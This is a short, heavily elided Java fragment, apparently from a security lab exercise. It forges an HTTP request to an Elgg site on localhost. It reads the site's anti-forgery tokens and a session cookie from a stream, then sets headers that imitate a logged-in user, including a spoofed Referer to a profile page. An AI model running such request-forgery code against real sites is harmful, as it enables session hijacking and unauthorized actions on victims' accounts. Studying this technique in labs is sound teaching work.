...
public class HTTPSimpleForge {
	public static void main(String[] args) throws IOException {
		try {
			...
			BufferedReader buffer = new BufferedReader(new InputStreamReader(responseIn));
			String requestDetails = "&__elgg_ts=" + buffer.readLine() + "&__elgg_token=" + buffer.readLine();
			...
			urlConn.addRequestProperty("Cookie", buffer.readLine());
			...
			urlConn.addRequestProperty("Connection", "keep-alice");
			urlConn.addRequestProperty("DNT", "1");
			urlConn.addRequestProperty("Host", "localhost:8082");
			urlConn.addRequestProperty("Referer", "http://localhost:8082/profile/boby");
			urlConn.addRequestProperty("Sec-GPC", "1");
